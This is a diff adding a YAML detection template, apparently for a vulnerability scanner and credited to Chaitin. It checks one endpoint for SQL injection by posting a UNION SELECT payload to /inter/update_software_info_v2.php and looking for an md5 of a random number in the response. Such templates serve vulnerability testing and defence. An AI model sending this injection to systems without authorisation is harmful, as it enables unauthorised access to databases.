@@ -1,0 +1,20 @@
+name: poc-yaml-zdv9-sqli
+manual: true
+transport: http
+set:
+    s1: string(randomInt(10000000, 99999999))
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /inter/update_software_info_v2.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: type=-100+UNION+SELECT+1,md5({{s1}}),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+        expression: response.body_string.contains(md5(s1))
+expression: r0()
+detail:
+    author: Chaitin
+    links:
+        - https://stack.chaitin.com/techblog/detail/165
